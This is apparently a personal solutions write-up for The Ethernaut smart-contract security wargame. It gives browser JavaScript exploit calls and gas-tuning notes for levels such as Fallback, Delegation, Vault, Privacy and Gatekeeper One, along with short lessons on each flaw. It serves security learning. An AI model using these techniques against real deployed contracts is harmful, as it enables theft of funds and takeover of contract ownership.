# The Ethernaut

## Level 0: Hello Ethernaut

```JavaScript
await contract.info()                       // You will find what you need in info1().
await contract.info1()                      // Try info2(), but with "hello" as a parameter.
await contract.info2('hello')               // The property infoNum holds the number of the next info method to call.
(await contract.infoNum()).toString()       // 42
await contract.info42()                     // theMethodName is the name of the next method.
await contract.theMethodName()              // The method name is method7123949.
await contract.method7123949()              // If you know the password, submit it to authenticate().
const password = await contract.password()
contract.authenticate(password)
```

## Level 1: Fallback
```JavaScript
contract.contribute({ value: 1 })
contract.sendTransaction({ value: 1 })
contract.withdraw()
```

## Level 2: Fallout
```JavaScript
contract.Fal1out({ value: 1 })              // That's Fal-1-out... (o:
```

### Lesson Learned
Contract name must be equal to the constructor name.  Otherwise it will be publicly available for calling...

## Level 4: Telephone
### Lesson Learned
Reference: https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin

In a sample call chain `A -> B -> C -> D`, inside D:
`msg.sender` = C (can be a contract)
`tx.origin` = A (must be an entity)

## Level 5: Token
```JavaScript
contract.transfer("0x0", 21)
```

## Level 6: Delegation
```JavaScript
contract.sendTransaction({ data: '0xdd365b8b' })
/*
 bytes4(keccak256('pwn()'))
 = bytes4(0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab)
 = 0xdd365b8b
 
 By calling the delegate "pwn()", the owner can be changed.
 */
```

## Level 8: Vault
```JavaScript
// Obtain the password
web3.eth.getStorageAt(contract.address, 1, (err, res) => {
  contract.unlock(res)
})
```

## Level 9: King

## Level 10: Re-entrancy

## Level 11: Elevator

Executing `ElevatorExploit.attack()` with different values of gas.  Steps 270 and 441 in VM trace is the operation to obtain `msg.gas` for determining `isLastFloor`.

1.  https://ropsten.etherscan.io/vmtrace?txhash=0xbc803aa91687e2746953b323f5d20bf45c6292a0b802af6955bdd5dcf99cf69d (total gas = 60000, floor = 1337)
    `msg.gas = 26424`.  We set `floor = 316` so that `(msg.gas + floor) % 1337 = 26740 % 1337 = 0`.
2.  https://ropsten.etherscan.io/vmtrace?txhash=0x11308f9a9699924a66624800d75bd80183f0de500092b4204067a9f8d9c4c2dd (total gas = 60000, floor = 316)
    Done.

## Level 12: Privacy

```JavaScript
web3.eth.getStorageAt(contract.address, 0, (err, res) => {
  alert(res)
})

//                                                                   ID
//                                                                 fl..attening
//                                                               de....nomination
//                                                           awkw......ardness
// > 0x0000000000000000000000000000000000000000000000000000005bb1ff0a01

web3.eth.getStorageAt(contract.address, 1, (err, res) => {
  alert(res)
})

//   data[0]
// > 0x55a025286f42846feb0cc561e3c9ab2192b6243b8fca1e2391e82b380025e742

web3.eth.getStorageAt(contract.address, 2, (err, res) => {
  alert(res)
})

//   data[1]
// > 0xdeb01339f4e2fa86210aa2b46a0f7f178dc305f4cb477a0caa0fc33f0ce04120

web3.eth.getStorageAt(contract.address, 3, (err, res) => {
  alert(res)
})

//   data[2]
// > 0x8f04ad8b567a647e628d2adcefb3d9ab58753533c0df20a3c56db16b258bf761

web3.eth.getStorageAt(contract.address, 4, (err, res) => {
  alert(res)
})

// > 0x0000000000000000000000000000000000000000000000000000000000000000

(await contract.ID()).toString(10)
// > 1534509758

contract.unlock('0x8f04ad8b567a647e628d2adcefb3d9ab')
```

## Level 13: Gatekeeper One

Executing `GatekeeperOneExploit.attack()` with different values of gas.  Step 167 in VM trace is the operation to obtain `msg.gas` for `msg.gas % 8191 == 0`.

1.  https://ropsten.etherscan.io/vmtrace?txhash=0x4beb2c697043c4d53c8cc0c04acd28f275f67d53c01ed99f618479f951e556cc (total gas = 100000)
    Seeing that `msg.gas = 75359` (the opcode `GAS` gets the amount of available gas *including* the reduction), we add it by 6551 so that `msg.gas` is divisible by 8191.
2.  https://ropsten.etherscan.io/vmtrace?txhash=0x270775bec32de6d234ff82067abdb98070bf6bae61d0bdd43a693d8b66909855 (total gas = 106551)
    `msg.gas = 81808` now.  Add the gas by 102 this time.
3.  https://ropsten.etherscan.io/vmtrace?txhash=0x65cc02403217edebd4cb742c10d50cdf7012a080f50d65c2c2c66a2ff32a63c4 (total gas = 106653)
    `msg.gas = 81908` now.  Add the gas by 2.
4.  https://ropsten.etherscan.io/vmtrace?txhash=0xd09a061d1e034a962f06a637a62699c9238bb3d56fd8f85ce31d1561e77312e5 (total gas = 106655)
    Done!

## Level 14: Gatekeeper Two

* `gateOne` requires the function to be called from a **contract**.
* `gateTwo` requires the function to be called from a **non-contract** or a **contract constructor**.

In short, the function should be called from a contract constructor.

## Level 15: Naught Coin
```JavaScript
contract.increaseApproval("0x4d0c516b5175a23d0f413e54622401202b8d7cc0", "1000000000000000000000000")
# Then execute NaughtCoinExploit.attack()
```

### Lesson Learned
Don't forget that one could approve someone to spend the token instead of oneself in ERC20 - check the unlocked balance instead of the total balance.

## Level 16: Preservation

## Level 17: Locked

## Level 18: Recovery

Transaction for deploying instance: https://ropsten.etherscan.io/tx/0xe6913b87b4f1e2eb0ee64dcad96276d741536561387de67f1edf13e19fca83d4

* Check the address for `SimpleToken` (where the 0.5 ETH is sent to): `0xcd8fee146597cadca0bc84482689e65342d8beb5`
```JavaScript
web3.eth.sendTransaction({ to: '0xcd8fee146597cadca0bc84482689e65342d8beb5', data: '0x00f55d9d000000000000000000000000bce00fd336be3be338458e93efc80da14f8a3e05' }, (err, res) => alert(res))
```